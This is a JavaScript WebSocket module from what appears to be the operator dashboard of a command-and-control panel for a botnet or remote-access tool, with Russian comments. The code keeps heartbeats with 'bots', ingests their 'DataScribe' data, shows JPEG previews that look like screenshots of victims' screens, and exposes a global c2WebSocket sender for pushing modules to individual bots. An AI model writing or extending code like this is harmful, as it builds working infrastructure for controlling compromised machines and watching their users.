/* frontend/dashboard/js/modules/websocket/connection.js */
import { updateClient, updateClients, setClientPreview } from '../data/clients.js';
import { decodePacket, encodePacket } from './protocol.js';
import { Renderer } from '../ui/renderer.js'; // <--- ДОБАВЛЕНО

let ws, pingInterval;
const decoder = new TextDecoder();

const sendPing = (id) => ws?.readyState === 1 && ws.send(encodePacket(id, "Heartbeat", "ping"));

export function connectWebSocket() {
    const token = localStorage.getItem('auth_token');
    const login = localStorage.getItem('user_login');
    if (!token || !login) return;

    const prot = location.protocol === 'https:' ? 'wss:' : 'ws:';
    ws = new WebSocket(`${prot}//${location.host}/ws?login=${encodeURIComponent(login)}&token=${token}`);
    ws.binaryType = 'arraybuffer';

    ws.onopen = () => {
        console.log("🚀 [WS] Connected");
        if (pingInterval) clearInterval(pingInterval);
        pingInterval = setInterval(() => sendPing(""), 5000);
    };

    ws.onmessage = ({ data }) => {
        if (!(data instanceof ArrayBuffer)) return;
        const pkg = decodePacket(data);
        if (!pkg || pkg.module === 'pong') return;

        // 1. Простое подтверждение жизни (пинги)
        if (pkg.module === 'Heartbeat') {
            return updateClient({ id: pkg.id }, true); 
        }

        // 2. Полноценные данные бота
        if (pkg.module === 'DataScribe') {
            try {
                const raw = JSON.parse(decoder.decode(pkg.payload));
                if (Array.isArray(raw)) {
                    updateClients(raw);
                    setTimeout(() => raw.forEach(b => b.id && sendPing(b.id)), 100);
                } else {
                    // ВАЖНО: передаем true, чтобы статус стал online при получении данных
                    updateClient({ ...raw, id: pkg.id || raw.id }, true);
                }
            } catch (e) {
                // Логика превью остается без изменений
                if (pkg.payload.byteLength > 100) {
                    const url = URL.createObjectURL(new Blob([pkg.payload], { type: 'image/jpeg' }));
                    setClientPreview(pkg.id, url);
                    Renderer.updatePreview(pkg.id, url);
                }
            }
        }
    };

    const cleanup = () => {
        if (pingInterval) clearInterval(pingInterval);
        setTimeout(connectWebSocket, 5000);
    };

    ws.onclose = cleanup;
    ws.onerror = (e) => { console.error("[WS] Error:", e); cleanup(); };

    window.c2WebSocket = { send: (id, mod, pay) => ws?.readyState === 1 && ws.send(encodePacket(id, mod, pay)) };
}